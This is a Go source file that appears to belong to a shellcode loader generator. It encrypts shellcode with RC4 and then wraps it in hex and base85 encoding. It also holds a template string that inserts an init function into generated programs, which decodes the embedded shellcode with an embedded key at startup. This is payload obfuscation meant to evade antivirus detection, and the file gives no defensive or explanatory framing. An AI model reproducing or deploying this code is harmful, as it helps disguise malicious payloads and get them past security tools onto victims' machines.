package encode

import (
	"encoding/hex"
	"github.com/darkwyrm/b85"
)

var Decode3string = []string{
	`//go:embed key
var key []byte

func init() {
	//__FENLI__
	shellcode, _ = b85.Decode(string(shellcode))
	shellcode, _ = hex.DecodeString(string(shellcode))
	shellcode = rc4decode(shellcode, key)
}
func rc4decode(shellcode []byte, key []byte) []byte {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		log.Println(err)
	}
	decryptedBytes := make([]byte, len(shellcode))
	cipher.XORKeyStream(decryptedBytes, shellcode)
	return decryptedBytes
}`,
	`
	"github.com/darkwyrm/b85"
	"crypto/rc4"
	"encoding/hex"
	"log"
	//__IMPORT__`,
}

//rc4+hex+base85
func Encode3(shellcode []byte, key []byte) []byte {
	var encodedbyte []byte
	//encodedbyte = Xor(shellcode, key)
	encodedbyte = rc4encode(shellcode, key)
	encodedbyte = []byte(hex.EncodeToString(encodedbyte))
	//encodedbyte = []byte(hex.EncodeToString(encodedbyte))
	encodedbyte = []byte(b85.Encode(encodedbyte))
	return encodedbyte
}

func Decode3(encodedbyte []byte, key []byte) []byte {
	var shellcode []byte
	shellcode, _ = b85.Decode(string(encodedbyte))
	shellcode, _ = hex.DecodeString(string(shellcode))
	//shellcode, _ = hex.DecodeString(string(shellcode))
	shellcode = rc4decode(shellcode, key)
	//shellcode = Xor(shellcode, key)
	return shellcode
}
